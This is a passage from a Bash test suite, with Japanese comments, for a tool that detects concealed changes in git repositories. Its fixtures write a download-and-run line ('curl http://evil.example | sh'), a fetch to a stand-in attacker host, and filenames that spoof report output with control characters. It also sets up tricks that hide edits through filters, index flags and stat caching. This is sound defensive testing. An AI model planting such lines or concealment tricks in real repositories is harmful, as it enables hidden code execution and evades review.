  ckeq "㉙ $flag を設定して変更: exit 22" "$RC" 22
  secf "$OUT" "改竄の疑い"
  ckt "㉙ run.sh が index フラグ: $flag で載る" ing "$SECF" "^run\.sh	index フラグ: $flag	"
  headf "$OUT"
  ckt "㉙ 見出しに WARNING($flag)" inf "$HDF" 'WARNING: 改竄の疑いがある'
done
for flag in assume-unchanged skip-worktree; do
  base_repo "c29del_$flag"
  printf 'echo hi\n' >"$R/run.sh"
  GIT "$R" add run.sh
  GIT "$R" commit -q -m run
  B="$(GIT "$R" rev-parse HEAD)"
  GIT "$R" update-index "--$flag" run.sh
  rm -f "$R/run.sh"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉙ $flag を付けて削除(sparse でない repo): exit 22" "$RC" 22
done
# 本物の sparse-checkout
base_repo c29sp
mkdir -p "$R/hidden" "$R/insparse"
printf 'echo hi\n' >"$R/run.sh"
printf 'IN\n' >"$R/insparse/in.txt"
printf 'BOTH\n' >"$R/both.txt"
i=1
while [ "$i" -le 21 ]; do
  printf 'H%s\n' "$i" >"$R/hidden/h$(printf '%02d' "$i").txt"
  i=$((i + 1))
done
GIT "$R" add -A
GIT "$R" commit -q -m sparse
B="$(GIT "$R" rev-parse HEAD)"
GIT "$R" config core.sparseCheckout true
printf '/*\n!/hidden/\n' >"$R/.git/info/sparse-checkout"
# core.sparseCheckout が true のとき、git は index を読むたびに
# 「作業ツリーに在るパスの skip-worktree」を落とす。先に作業ツリーから消してから立てる
# (後で立てると、直前に立てたぶんが次の update-index で落ち、最後の 1 本しか残らない)
rm -rf "$R/hidden"
i=1
while [ "$i" -le 21 ]; do
  GIT "$R" update-index --skip-worktree "hidden/h$(printf '%02d' "$i").txt"
  i=$((i + 1))
done
ckeq "㉙ 21 本すべてに skip-worktree が立つ構成になっている" "$(GIT "$R" ls-files -v -- 'hidden/*' | grep -c '^S ')" 21
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉙ 本物の sparse-checkout の定義外: exit 0" "$RC" 0
headf "$OUT"
ckt "㉙ NOTE に件数(全数)が出る" inf "$HDF" 'sparse-checkout で作業ツリーに無い skip-worktree: 21 件'
ckeq "㉙ NOTE のパスは先頭 20 件" "$(grep -o 'hidden/h[0-9][0-9]\.txt' "$HDF" | wc -l | tr -d ' ')" 20
secf "$OUT" "追跡差分"
ckf "㉙ 定義外の skip-worktree は削除として本文に出ない" inf "$SECF" 'hidden/h01.txt'
GIT "$R" update-index --skip-worktree run.sh
rm -f "$R/run.sh"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉙ sparse の定義に入るパスに skip-worktree を付けて削除: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉙ 定義内のパスは例外にならない" ing "$SECF" '^run\.sh	index フラグ: skip-worktree	'
GIT "$R" update-index --no-skip-worktree run.sh
GIT "$R" checkout -q -- run.sh
GIT "$R" update-index --assume-unchanged both.txt
GIT "$R" update-index --skip-worktree both.txt
rm -f "$R/both.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉙ 両フラグを付けたパス: exit 22" "$RC" 22
ckeq "㉙ ls-files -v が s を返す構成になっている" "$(GIT "$R" ls-files -v -- both.txt | cut -c1)" 's'
secf "$OUT" "改竄の疑い"
ckt "㉙ 理由に 2 つのフラグ名が並ぶ" ing "$SECF" '^both\.txt	index フラグ: assume-unchanged,skip-worktree	'

# ── ㉚ --precheck ──
base_repo c30
printf 'echo hi\n' >"$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
mkdir -p "$R/.git/info"
printf '*.sh filter=hide\n' >"$R/.git/info/attributes"
GIT "$R" config filter.hide.clean "sh $STUBS/trace-clean.sh"
export SELFTEST_TRACE="$WORK/tr30"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --precheck
ckeq "㉚(i) 疑いのある repo で --precheck: exit 22" "$RC" 22
ckt "㉚(i) stderr に filter.hide.clean" inf "$CASE_ERR" 'filter.hide.clean'
ckt "㉚(i) stderr に .git/info/attributes" inf "$CASE_ERR" '.git/info/attributes'
ckf "㉚(i) --out が作られない" test -e "$OUT"
ckt "㉚(i) .diff-snapshot. ディレクトリが作られない" no_pubdir "$R"
ckeq "㉚(i) 痕跡ファイルが無い" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
base_repo c30b
run --cwd "$R" --precheck
ckeq "㉚(ii) 何も仕込まない repo: exit 0" "$RC" 0
ckeq "㉚(ii) stdout が空" "$(wc -c <"$CASE_OUT" | tr -d ' ')" 0
ckeq "㉚(ii) stderr が空" "$(wc -c <"$CASE_ERR" | tr -d ' ')" 0
run --cwd "$R" --precheck --out "$WORK/x30.md"
ckeq "㉚(iii) --precheck --out: exit 2" "$RC" 2
mkdir -p "$WORK/c30notrepo"
run --cwd "$WORK/c30notrepo" --precheck
ckeq "㉚(iv) git repo でないディレクトリ: exit 2" "$RC" 2
base_repo c30c
HOOKS30="$WORK/hooks30"
mkdir -p "$HOOKS30"
printf '#!/usr/bin/env bash\nexit 0\n' >"$HOOKS30/pre-commit"
chmod +x "$HOOKS30/pre-commit"
GIT "$R" config core.hooksPath "$HOOKS30"
run --cwd "$R" --precheck
ckeq "㉚(iv′) 正当なフックだけの repo: exit 0" "$RC" 0
ckeq "㉚(iv′) stdout が空" "$(wc -c <"$CASE_OUT" | tr -d ' ')" 0
ckt "㉚(iv′) NOTE は stderr に出る" inf "$CASE_ERR" 'NOTE: 無効化して実行:'
base_repo c30d
mkdir -p "$WORK/decoy30"
GIT "$R" config core.worktree "$WORK/decoy30"
run --cwd "$R" --precheck
ckeq "㉚(v) core.worktree 差し替え構成で --precheck: exit 22" "$RC" 22
ckt "㉚(v) stderr に ローカル設定: core.worktree" inf "$CASE_ERR" 'ローカル設定: core.worktree'

# ── ㉛ --accept(ユーザー承認による復帰)──
TB=$(printf '\t')
digest_of() { sed -n 's/^承認ダイジェスト: //p' "$CASE_ERR" | tail -1; }

# ㉔(i) と同じ構成(clean は無害な cat)
base_repo c31
printf 'echo hi\n' >"$R/run.sh"
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add run.sh app.ts
GIT "$R" commit -q -m run
B="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
mkdir -p "$R/.git/info"
printf '*.sh filter=hide\n' >"$R/.git/info/attributes"
GIT "$R" config filter.hide.clean 'cat'
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ 承認前: exit 22" "$RC" 22
D31="$(digest_of)"
ckt "㉛ 承認ダイジェストが 64 桁の 16 進" ing <(printf '%s\n' "$D31") '^[0-9a-f]\{64\}$'
ckeq "㉛ stderr の最終行が承認ダイジェスト" "$(tail -n 1 "$CASE_ERR")" "承認ダイジェスト: $D31"
secf "$OUT" "改竄の疑い"
ckeq "㉛ 改竄の疑いの末尾にも同じ行" "$(grep -v '^$' "$SECF" | tail -n 1)" "承認ダイジェスト: $D31"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛ 承認して再実行: exit 0" "$RC" 0
secf "$OUT" "改竄の疑い"
ckt "㉛ 承認後は改竄の疑いが空" inf "$SECF" '(差分なし)'
headf "$OUT"
ckt "㉛ NOTE に承認済みとして扱った項目 3 件" inf "$HDF" "承認済みとして扱った項目: 3 件(承認ダイジェスト $D31)"
ckt "㉛ 承認済みの 1 行目(ローカル設定)" ing "$HDF" "^- NOTE: 承認済み: filter\.hide\.clean${TB}ローカル設定: filter\.hide\.clean\$"
ckt "㉛ 承認済みの 2 行目(.git/info/attributes)" ing "$HDF" "^- NOTE: 承認済み: \.git/info/attributes${TB}\.git/info/attributes\$"
ckt "㉛ 承認済みの 3 行目(filter 属性)" ing "$HDF" "^- NOTE: 承認済み: run\.sh${TB}filter 属性: hide\$"
ckt "㉛ NOTE に承認済みの filter を実行せず実内容で比較した" inf "$HDF" '承認済みの filter を実行せず実内容で比較した: hide'
secf "$OUT" "追跡差分"
ckt "㉛ 本文が通常どおり生成される" inf "$SECF" '+curl http://evil.example | sh'
reset_out
run --cwd "$R" --precheck --accept "$D31"
ckeq "㉛ --precheck に同じ値: exit 0" "$RC" 0

# ㉛ 相乗りの拒否 (a) 別の追跡パスに同じ理由の行を生じさせる
printf '*.ts filter=hide\n' >"$R/.gitattributes"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛(a) 相乗りした行があると exit 22" "$RC" 22
ckt "㉛(a) stderr に承認ダイジェストが一致しない" inf "$CASE_ERR" '承認ダイジェストが一致しない'
D31A="$(digest_of)"
ckne "㉛(a) 新しい承認ダイジェストの行が続く" "$D31A" ""
ckne "㉛(a) 承認ダイジェストが変わる" "$D31A" "$D31"
ckt "㉛(a) app.ts が同じ理由で載る" ing "$CASE_ERR" "^app\.ts${TB}filter 属性: hide${TB}"
rm -f "$R/.gitattributes"

# ㉛ 相乗りの拒否 (b) 承認済みキーの値を差し替える
export SELFTEST_TRACE="$WORK/tr31b"
: >"$SELFTEST_TRACE"
GIT "$R" config filter.hide.clean "sh $STUBS/trace-clean.sh"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛(b) 値を差し替えると exit 22" "$RC" 22
ckt "㉛(b) stderr に承認ダイジェストが一致しない" inf "$CASE_ERR" '承認ダイジェストが一致しない'
ckne "㉛(b) 新しい承認ダイジェストが出る" "$(digest_of)" "$D31"
ckeq "㉛(b) 痕跡が作られない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
GIT "$R" config filter.hide.clean 'cat'
# 1 文字違う値は無視される
D31X="${D31%?}0"
[ "$D31X" = "$D31" ] && D31X="${D31%?}1"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept "$D31X"
ckeq "㉛ 1 文字違う承認ダイジェスト: exit 22 のまま" "$RC" 22
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --accept "$D31" --accept "$D31"
ckeq "㉛ --accept の 2 回指定: exit 2" "$RC" 2

# ㉛ core.worktree 差し替えは承認の対象外
base_repo c31w
printf 'echo hi\n' >"$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B31W="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
mkdir -p "$WORK/decoy31"
GIT "$R" config core.worktree "$WORK/decoy31"
reset_out
run --cwd "$R" --base "$B31W" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ core.worktree 差し替え: exit 22" "$RC" 22
ckf "㉛ core.worktree では承認ダイジェストの行が出ない" inf "$CASE_ERR" '承認ダイジェスト:'
reset_out
run --cwd "$R" --base "$B31W" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛ core.worktree はどの値を承認しても exit 22" "$RC" 22

# ── ㉛ stdout の機械可読出力(名前に = / 空白 / . を含む filter を含む)──
base_repo c31tok
printf 'echo hi\n' >"$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B31T="$(GIT "$R" rev-parse HEAD)"
# 同じバイト数の書き換えにする(サイズが変わると git status は内容を読まずに変更ありと判定し、
# clean が走らないので「無効化していなければ走る」の確認が空振りする)
printf 'echo HI\n' >"$R/run.sh"
mkdir -p "$R/.git/info"
printf '*.sh filter=hide\n' >"$R/.git/info/attributes"
export SELFTEST_TRACE="$WORK/tr31tok"
: >"$SELFTEST_TRACE"
GIT "$R" config filter.hide.clean "sh $STUBS/trace-clean.sh"
GIT "$R" config 'filter.a b.clean' "sh $STUBS/trace-clean.sh"
GIT "$R" config 'filter.a=b.clean' "sh $STUBS/trace-clean.sh"
GIT "$R" config 'filter.a.b.clean' "sh $STUBS/trace-clean.sh"
# 無効化しなければ clean が走る構成であることを確かめる(アサーションが空振りしないため)
OGIT "$R" status --porcelain >/dev/null 2>&1
ckne "㉛ 無効化しなければ clean が走る構成になっている" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
reset_out
run --cwd "$R" --base "$B31T" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ トークン構成: 承認前は exit 22" "$RC" 22
D31T="$(digest_of)"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B31T" --out "$OUT" --exclude-glob '.env' --accept "$D31T"
ckeq "㉛ トークン構成: 承認後は exit 0" "$RC" 0
ckeq "㉛ 承認しても clean は実行されない(痕跡なし)" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
TOK31=0
CNT31=""
while IFS= read -r -d '' t31; do
  [ "$TOK31" -eq 0 ] && CNT31="${t31#GIT_CONFIG_COUNT=}"
  TOK31=$((TOK31 + 1))
done <"$CASE_OUT"
ckne "㉛ 先頭トークンが GIT_CONFIG_COUNT" "$CNT31" ""
ckeq "㉛ トークン数が COUNT × 2 + 1" "$TOK31" "$((CNT31 * 2 + 1))"
ckt "㉛ stdout に filter.hide.clean のキーが出る" inf "$CASE_OUT" 'GIT_CONFIG_KEY_0=filter.hide.clean'
: >"$SELFTEST_TRACE"
tok31_rc=0
(
  n31=0
  while IFS= read -r -d '' t31; do export "${t31?}"; n31=$((n31 + 1)); done <"$CASE_OUT"
  [ "$n31" -eq "$TOK31" ] || exit 3
  for nm31 in 'hide' 'a b' 'a=b' 'a.b'; do
    v31="$("$REAL_GIT" -C "$R" config --get "filter.$nm31.clean")" || exit 4
    [ -z "$v31" ] || exit 5
  done
  "$REAL_GIT" -C "$R" status --porcelain >/dev/null 2>&1 || exit 6
) || tok31_rc=$?
ckeq "㉛ トークンを export すると git status が rc 0 で完了する" "$tok31_rc" 0
ckeq "㉛ トークンで無効化すると clean が走らない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㉛ 承認しても filter は実行しない(リポジトリ内のスクリプトを参照する clean)──
base_repo c31f
printf 'echo hi\n' >"$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B31F="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
mkdir -p "$R/.git/info" "$R/.filters"
printf '*.sh filter=hide\n' >"$R/.git/info/attributes"
cp -- "$STUBS/trace-clean.sh" "$R/.filters/c.sh"
GIT "$R" config filter.hide.clean 'sh ./.filters/c.sh'
export SELFTEST_TRACE="$WORK/tr31f"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B31F" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ リポジトリ内 clean: 承認前は exit 22" "$RC" 22
D31F="$(digest_of)"
reset_out
run --cwd "$R" --base "$B31F" --out "$OUT" --exclude-glob '.env' --accept "$D31F"
ckeq "㉛ リポジトリ内 clean: 承認後は exit 0" "$RC" 0
ckeq "㉛ 承認しても clean の痕跡が作られない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
secf "$OUT" "追跡差分"
ckt "㉛ 追跡差分に作業ツリーの実内容が出る" inf "$SECF" '+curl http://evil.example | sh'
headf "$OUT"
ckt "㉛ 見出しに承認済みの filter の NOTE" inf "$HDF" '承認済みの filter を実行せず実内容で比較した: hide'
# 承認の後で clean のスクリプトを差し替えても同じ
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "swapped $*" >>"$SELFTEST_TRACE"\ncat\n' >"$R/.filters/c.sh"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B31F" --out "$OUT" --exclude-glob '.env' --accept "$D31F"
ckeq "㉛ clean のスクリプトを差し替えても exit 0" "$RC" 0
ckeq "㉛ 差し替え後も痕跡が作られない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㉛ 表示の無害化(1 列目の制御文字)──
EVILNAME="$(printf 'evil\nbenign.ts\tfilter 属性: hide\t-')"
base_repo c31s
printf '* filter=hide\n' >"$R/.gitattributes"
printf 'body\n' >"$R/$EVILNAME"
GIT "$R" add -A
GIT "$R" commit -q -m evil
B31S="$(GIT "$R" rev-parse HEAD)"
printf 'more\n' >>"$R/$EVILNAME"
GIT "$R" config filter.hide.clean 'cat'
reset_out
run --cwd "$R" --base "$B31S" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ 制御文字入りの名前: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉛ 1 列目の制御文字が ? に置き換わり 1 行で出る" \
  ing "$SECF" "^evil?benign\.ts?filter 属性: hide?-${TB}filter 属性: hide${TB}-\$"
ckf "㉛ 実在しない benign.ts の行に見えない" ing "$SECF" "^benign\.ts${TB}"
ckt "㉛ stderr でも同じ 1 行で出る" ing "$CASE_ERR" "^evil?benign\.ts?filter 属性: hide?-${TB}filter 属性: hide${TB}-\$"
D31S1="$(digest_of)"
reset_out
run --cwd "$R" --base "$B31S" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ 同じ構成を 2 回実行すると承認ダイジェストが同値" "$(digest_of)" "$D31S1"
# 制御文字だけが違う 2 構成では承認ダイジェストが異なる
D31CR=""
for ctl in n r; do
  base_repo "c31s_$ctl"
  if [ "$ctl" = n ]; then nm="$(printf 'a\nb.ts')"; else nm="$(printf 'a\rb.ts')"; fi
  printf '* filter=hide\n' >"$R/.gitattributes"
  printf 'body\n' >"$R/$nm"
  GIT "$R" add -A
  GIT "$R" commit -q -m ctl
  B31C="$(GIT "$R" rev-parse HEAD)"
  printf 'more\n' >>"$R/$nm"
  GIT "$R" config filter.hide.clean 'cat'
  reset_out
  run --cwd "$R" --base "$B31C" --out "$OUT" --exclude-glob '.env'
  ckeq "㉛ 制御文字($ctl)の構成: exit 22" "$RC" 22
  ckt "㉛ 表示はどちらも a?b.ts($ctl)" ing "$CASE_ERR" "^a?b\.ts${TB}filter 属性: hide${TB}"
  if [ "$ctl" = n ]; then D31CR="$(digest_of)"; else
    ckne "㉛ 制御文字だけが違う構成では承認ダイジェストが異なる" "$(digest_of)" "$D31CR"
  fi
done

# ── ㉛ 2 列目・ESC の無害化 ──
base_repo c31e
printf 'const a = 1;\n' >"$R/app.ts"
printf "*.ts filter=$(printf 'x\033y')\n" >"$R/.gitattributes"
GIT "$R" add -A
GIT "$R" commit -q -m esc
B31E="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2;\n' >>"$R/app.ts"
INC31E="$WORK/inc31e"
printf '[filter "hide"]\n\tclean = cat\n' >"$INC31E"
printf '[includeIf "gitdir:/a\tb/"]\n\tpath = %s\n' "$INC31E" >>"$R/.git/config"
# ESC 入りの名前で clean を定義する(承認後の無効化が「置換前の生の名前」で効いているかを見る)
ESCNAME="$(printf 'x\033y')"
export SELFTEST_TRACE="$WORK/tr31e"
: >"$SELFTEST_TRACE"
GIT "$R" config "filter.$ESCNAME.clean" "sh $STUBS/trace-clean.sh"
mkdir -p "$R/.git/info"
# ここでの目的は「.git/info/attributes の行の 1 列目が固定文字列であること」なので、
# 疑いの行だけを生やし、app.ts の属性(ESC 入り)を上書きしないパターンにする
printf '*.md filter=hide\n' >"$R/.git/info/attributes"
reset_out
run --cwd "$R" --base "$B31E" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ ESC と タブ入りキー名: exit 22" "$RC" 22
ckt "㉛ includeIf のキー名のタブが ? になり 1 行で出る" \
  ing "$CASE_ERR" "^includeif\.gitdir:/a?b/\.path${TB}include: includeif\.gitdir:/a?b/\.path${TB}"
ckt "㉛ 2 列目の ESC も ? になる" ing "$CASE_ERR" "^app\.ts${TB}filter 属性: x?y${TB}-\$"
ckf "㉛ stderr に生の ESC が残らない" ing "$CASE_ERR" "$(printf '\033')"
ckt "㉛ .git/info/attributes の 1 列目は固定文字列" ing "$CASE_ERR" "^\.git/info/attributes${TB}\.git/info/attributes${TB}"
D31E="$(digest_of)"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B31E" --out "$OUT" --exclude-glob '.env' --accept "$D31E"
ckeq "㉛ ESC 構成を承認すると exit 0" "$RC" 0
headf "$OUT"
ckt "㉛ NOTE の列挙でも置換が掛かり 1 行で出る" ing "$HDF" "^- NOTE: 承認済み: app\.ts${TB}filter 属性: x?y\$"
grep '^- NOTE: 承認済み: ' "$HDF" >"$WORK/note31e" 2>/dev/null || : >"$WORK/note31e"
ckf "㉛ 承認済みとして扱った項目の列挙に生の ESC が残らない" ing "$WORK/note31e" "$(printf '\033')"
# 承認後の NOTE「承認済みの filter を…」の filter 名にも置換が掛かる
ckt "㉛ 承認済みの filter の NOTE にも置換が掛かる" inf "$HDF" '承認済みの filter を実行せず実内容で比較した: x?y'
ckf "㉛ --out の見出しに生の ESC が残らない" ing "$HDF" "$(printf '\033')"
ckf "㉛ --out 全体に生の ESC が残らない" ing "$OUT" "$(printf '\033')"
ckf "㉛ 承認時の stderr に生の ESC が残らない" ing "$CASE_ERR" "$(printf '\033')"
ckeq "㉛ 承認しても ESC 名の clean は実行されない(無効化は生の名前で効く)" \
  "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --precheck --accept "$D31E"
ckeq "㉛ ESC 構成を承認した --precheck: exit 0" "$RC" 0
ckt "㉛ --precheck の NOTE にも置換が掛かる" inf "$CASE_ERR" '承認済みの filter を実行せず実内容で比較した: x?y'
ckf "㉛ --precheck の stderr に生の ESC が残らない" ing "$CASE_ERR" "$(printf '\033')"
ckeq "㉛ --precheck でも ESC 名の clean は実行されない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0

# ── ㉛ 設定の行の 4 列目は 200 文字で切る(内容ダイジェストは切る前の値から)──
base_repo c31c
# 300 文字の値。include.path は git が実際に開きに行くので、
# 1 要素が長すぎない絶対パス(10 文字ごとに / を入れる)にする。
# 多バイト文字を混ぜて「バイトではなく文字で 200 に切る」ことを見る
build31() { # $1=文字数(先頭の / を含む) → BUILT31
  BUILT31="/"
  local k=1
  while [ "$k" -le $(( $1 - 1 )) ]; do
    if [ $((k % 10)) -eq 0 ]; then BUILT31="${BUILT31}/"; else BUILT31="${BUILT31}ど"; fi
    k=$((k + 1))
  done
}
build31 300; LONG31="$BUILT31"
build31 200; EXP31="$BUILT31"
GIT "$R" config include.path "$LONG31"
ckf "㉛ 300 文字の include.path は実在しない(git は黙って無視する)" test -e "$LONG31"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ 300 文字の値の include.path: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
C4_31="$(awk -F'\t' '$1=="include.path"{print $4}' "$SECF")"
C3_31="$(awk -F'\t' '$1=="include.path"{print $3}' "$SECF")"
ckeq "㉛ --out の 4 列目が 200 文字で切られている" "$C4_31" "$EXP31"
ckeq "㉛ 3 列目の内容ダイジェストは切る前の 300 文字の値の sha256" \
  "$C3_31" "$(printf '%s' "$LONG31" | sha256sum | cut -d' ' -f1)"
C4E_31="$(awk -F'\t' '$1=="include.path"{print $4}' "$CASE_ERR")"
ckeq "㉛ stderr の 4 列目も同じ 200 文字" "$C4E_31" "$EXP31"
# 200 バイトで切る実装との判別(多バイトなので 200 文字 ≠ 200 バイト)
ckne "㉛ 4 列目はバイト単位で切られていない" "${#C4_31}" 200
ckeq "㉛ 4 列目のバイト数が 200 文字ぶんと一致(文字の途中で切れていない)" "${#C4_31}" "${#EXP31}"
reset_out
run --cwd "$R" --precheck
ckeq "㉛ --precheck でも exit 22" "$RC" 22
ckeq "㉛ --precheck の 4 列目も同じ 200 文字" \
  "$(awk -F'\t' '$1=="include.path"{print $4}' "$CASE_ERR")" "$EXP31"

# ── ㉛ 承認できない疑い ──
base_repo c31n1
printf '$Id$\n' >"$R/a.txt"
printf '*.txt ident\n' >"$R/.gitattributes"
GIT "$R" add -A
GIT "$R" commit -q -m ident
B31N="$(GIT "$R" rev-parse HEAD)"
printf '$Id: PAYLOAD $\n' >"$R/a.txt"
reset_out
run --cwd "$R" --base "$B31N" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ ident 構成: exit 22" "$RC" 22
ckf "㉛ ident 構成では承認ダイジェストの行が出ない" inf "$CASE_ERR" '承認ダイジェスト:'
reset_out
run --cwd "$R" --base "$B31N" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛ ident 構成はどの値を承認しても exit 22" "$RC" 22
base_repo c31n2
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add app.ts
GIT "$R" commit -q -m enc
B31N2="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2;\n' >>"$R/app.ts"
mkdir -p "$R/.git/info"
printf 'app.ts working-tree-encoding=UTF-16LE\n' >"$R/.git/info/attributes"
reset_out
run --cwd "$R" --base "$B31N2" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ working-tree-encoding 構成: exit 22" "$RC" 22
ckf "㉛ working-tree-encoding では承認ダイジェストの行が出ない" inf "$CASE_ERR" '承認ダイジェスト:'
reset_out
run --cwd "$R" --base "$B31N2" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛ working-tree-encoding はどの値を承認しても exit 22" "$RC" 22
base_repo c31n3
printf 'const a = 1;\n' >"$R/app.ts"
GIT "$R" add app.ts
GIT "$R" commit -q -m fifo
B31N3="$(GIT "$R" rev-parse HEAD)"
printf 'const b = 2;\n' >>"$R/app.ts"
mkdir -p "$R/.git/info"
mkfifo "$R/.git/info/attributes"
reset_out
grun --cwd "$R" --base "$B31N3" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ .git/info/attributes が FIFO: 待機せず exit 22" "$RC" 22
ckf "㉛ FIFO 構成では承認ダイジェストの行が出ない" inf "$CASE_ERR" '承認ダイジェスト:'
reset_out
grun --cwd "$R" --base "$B31N3" --out "$OUT" --exclude-glob '.env' --accept "$D31"
ckeq "㉛ FIFO 構成はどの値を承認しても exit 22" "$RC" 22
rm -f "$R/.git/info/attributes"

# ── ㉛ filter 名の取り出し(名前にドットを含む)──
base_repo c31d
printf 'const a = 1;\n' >"$R/app.ts"
printf '*.ts filter=a.b\n' >"$R/.gitattributes"
GIT "$R" add -A
GIT "$R" commit -q -m dot
B31D="$(GIT "$R" rev-parse HEAD)"
printf 'fetch("http://evil.example/x")\n' >>"$R/app.ts"
export SELFTEST_TRACE="$WORK/tr31d"
: >"$SELFTEST_TRACE"
GIT "$R" config 'filter.a.b.clean' "sh $STUBS/trace-clean.sh"
reset_out
run --cwd "$R" --base "$B31D" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ filter 名にドット: 承認前は exit 22" "$RC" 22
D31DG="$(digest_of)"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B31D" --out "$OUT" --exclude-glob '.env' --accept "$D31DG"
ckeq "㉛ filter 名にドット: 承認後は exit 0" "$RC" 0
ckeq "㉛ filter.a.b.clean が実行されない(痕跡なし)" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
secf "$OUT" "追跡差分"
ckt "㉛ 追跡差分に実内容が出る" ing "$SECF" '^+.*evil\.example'

# ── ㉛ 承認した lfs ──
export SELFTEST_LFS_TRACE="$WORK/lfs31"
: >"$SELFTEST_LFS_TRACE"
mk_lfs_repo c31l
GIT "$R" config filter.lfs.smudge 'git-lfs smudge --skip -- %f'
printf 'plain\n' >"$R/p.txt"
LGIT "$R" add p.txt >/dev/null 2>&1
LGIT "$R" commit -q -m p >/dev/null 2>&1
B31L="$(GIT "$R" rev-parse HEAD)"
printf 'changed\n' >>"$R/p.txt"
reset_out
runp "$WORK/lfsbin" --cwd "$R" --base "$B31L" --out "$OUT" --exclude-glob '.env'
ckeq "㉛ filter.lfs.smudge の上書き: exit 22" "$RC" 22
D31L="$(digest_of)"
reset_out
runp "$WORK/lfsbin" --cwd "$R" --base "$B31L" --out "$OUT" --exclude-glob '.env' --accept "$D31L"
ckeq "㉛ lfs を承認: exit 0" "$RC" 0
secf "$OUT" "追跡差分(stat)"
ckt "㉛ 内容を変えていない LFS 資産が stat に出る" inf "$SECF" 'data.bin'
headf "$OUT"
ckt "㉛ 承認した lfs の NOTE が出る" inf "$HDF" '承認済みの filter を実行せず実内容で比較した: lfs'
unset SELFTEST_LFS_TRACE

TB=$(printf '\t')

# ── ㉜ stat キャッシュによる隠蔽 ──
sha_file() { sha256sum -- "$1" | cut -d' ' -f1; }
C32_FIXED='@1000000000'
base_repo c32
mkdir -p "$R/src"
printf 'const t = "SAFEMARK";\n' >"$R/src/auth.ts"
GIT "$R" add src/auth.ts
GIT "$R" commit -q -m auth
B="$(GIT "$R" rev-parse HEAD)"
c32_hidden=0
c32_try=1
while [ "$c32_try" -le 5 ]; do
  # 秒の境界の直後から始め、書き戻し → refresh → 同じバイト数の別内容 を同じ秒のうちに行う
  c32_s="$(date +%S)"
  while [ "$(date +%S)" = "$c32_s" ]; do :; done
  printf 'const t = "SAFEMARK";\n' >"$R/src/auth.ts"
  touch -d "$C32_FIXED" -- "$R/src/auth.ts"
  OGIT "$R" update-index --refresh >/dev/null 2>&1
  printf 'const t = "EVILMARK";\n' >"$R/src/auth.ts"
  touch -d "$C32_FIXED" -- "$R/src/auth.ts"
  sleep 1.1
  if [ -z "$(OGIT "$R" diff --name-only "$B" 2>/dev/null)" ] && [ -z "$(OGIT "$R" status --porcelain 2>/dev/null)" ]; then
    c32_hidden=1
    break
  fi
  c32_try=$((c32_try + 1))
done
if [ "$c32_hidden" -eq 0 ]; then
  i=1
